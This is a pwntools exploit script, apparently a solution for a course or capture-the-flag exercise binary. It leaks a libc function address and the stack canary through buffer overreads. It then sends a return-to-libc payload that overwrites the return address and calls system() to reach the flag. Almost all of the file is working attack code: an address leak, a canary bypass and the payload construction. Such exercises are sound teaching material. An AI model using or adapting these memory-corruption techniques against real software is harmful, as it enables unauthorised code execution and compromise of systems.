#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
r.sendline(b'cat flag')
[r.recvline() for i in range(5)]

BUFFER_SIZE = 248
r.sendline(b'A' * (200 - 1))
r.recvline()
msg = r.recvline()
idx = msg.find(b'is not the password')
addd = msg[:idx - 1]
fgets = u64(addd.ljust(8, b'\x00')) - 154

r.recvline()
r.recvline()

r.sendline(b'A' * (BUFFER_SIZE - 1))
r.recvline()
canary = r.recvline()[:4]

elf = ELF(exe)
rop = ROP(elf)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
# libc.address = print_add - libc.symbols['fgets']
shift = fgets - libc.symbols['fgets']
name_add = p64(elf.symbols['name'])
system_address = p64(libc.symbols['system'])
check_auth = elf.symbols['check_authorization'] + 138

payload = b'A' * 248 + canary + b'A' * 12 + p64(check_auth) + p64(libc.symbols['system'] + shift) + p64(libc.symbols['exit'] + shift) + name_add

r.sendline(payload)
print(r.recvall())